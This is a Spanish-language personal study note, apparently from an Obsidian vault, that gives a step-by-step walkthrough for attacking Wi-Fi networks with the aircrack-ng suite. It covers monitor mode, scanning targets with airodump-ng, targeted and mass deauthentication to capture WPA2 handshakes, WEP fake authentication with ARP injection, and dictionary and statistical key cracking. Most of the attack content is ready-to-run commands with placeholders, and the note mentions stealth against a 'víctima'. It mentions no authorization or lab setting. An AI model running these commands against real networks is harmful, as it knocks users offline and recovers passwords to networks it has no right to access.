
---

### Preparación del Entorno

Antes de ejecutar cualquier ataque, verifica que tu adaptador inalámbrico (ej. Alfa AWUS036AC) está correctamente reconocido en la máquina virtual y que el controlador permite inyección de paquetes.

![[Pasted image 20260504103109.png]]

![[Pasted image 20260504103101.png]]

**1. Modo Monitor:** Para capturar tráfico ajeno, la tarjeta debe pasar de modo "Managed" a "Monitor".

- **Matar procesos conflictivos:** `sudo airmon-ng check kill` (evita que NetworkManager interfiera).
    
- **Activar modo:** `sudo airmon-ng start wlan0` (verificar si el nombre cambia a `wlan0mon`).

---
### Fase 1: Reconocimiento (Escaneo)

El objetivo es identificar el objetivo (BSSID), el canal y las direcciones MAC de los clientes conectados.

- **Comando:** 

```
airodump-ng wlan0
```

- **Fijar el objetivo:** Una vez detectado el canal y BSSID, filtra para evitar ruido y asegurar la captura de paquetes críticos.

```
airodump-ng -c [canal] --bssid [MAC_ROUTER] -w [nombre_captura] wlan0
```

---
### Fase 2: Ataques de Gestión (Desautorización - WPA2)

La vulnerabilidad reside en que las tramas de gestión (Deauth/Disassoc) viajan en texto plano, sin cifrar. Puedes forzar a un cliente a desconectarse y reconectarse, lo que permite capturar el _handshake_ (apretón de manos) si el cliente se vuelve a conectar.

![[Pasted image 20260504103046.png]]

- **Ataque Quirúrgico (dirigido a un cliente específico):** 

```
aireplay-ng --deauth 10 -a [BSSID_ROUTER] -c [MAC_CLIENTE] wlan0
```

 * Uso: Ideal para modo sigilo, desconecta solo a una víctima sin afectar a toda la red.
   
- **Ataque Masivo:** 

```
 aireplay-ng --deauth 10 -a [BSSID_ROUTER_Objetivo] wlan0
```

- _Uso:_ Desconecta a todos los dispositivos conectados al router. Genera mucho ruido y es más visible.

---

### Fase 3: Inyección de Paquetes (WEP)

El craqueo de WEP requiere miles de Vectores de Inicialización (IVs). El tráfico normal es demasiado lento, por lo que usamos inyección ARP para obligar al router a responder y generar IVs rápidamente.

![[Pasted image 20260504103127.png]]

1. **Autenticación Falsa (Pre-requisito):** Antes de inyectar, debes asociarte al AP.

```
aireplay-ng -1 0 -e [SSID] -a [BSSID] -h [MAC_ATACANTE] wlan0
```

2. **Inyección ARP (El motor del ataque)

```
aireplay-ng -3 -b [BSSID] -h [MAC_CLIENTE_ASOCIADO] wlan0
```

- Esta herramienta espera un paquete ARP y lo reinyecta continuamente hacia el router.    
-  _Éxito:_ Verás que el número de paquetes (`#/s`) en la ventana de `airodump-ng` aumenta masivamente.

---
### Fase 4: Recuperación de Contraseñas

Una vez capturado el archivo (ya sea el _handshake_ en WPA2 o suficientes IVs en WEP), utilizas `aircrack-ng` para procesar la captura offline:

- **WPA/WPA2 (Fuerza bruta con diccionario):** 

```
aircrack-ng -w [ruta_al_diccionario.txt] [nombre_captura-01.cap]
```

- **WEP (Estadístico)**

```
aircrack-ng [nombre_captura-01.cap]
```

---

### Resumen de Flujo de Trabajo

|**Acción**|**Herramienta**|**Objetivo**|
|---|---|---|
|**Monitorización**|`airodump-ng`|Identificar BSSID, canal y clientes.|
|**Desautorización**|`aireplay-ng --deauth`|Forzar reconexión (obtener Handshake WPA2).|
|**Inyección ARP**|`aireplay-ng -3`|Generar tráfico (IVs) masivo para WEP.|
|**Craqueo**|`aircrack-ng`|Descifrar clave con diccionario (WPA2) o estadísticas (WEP).|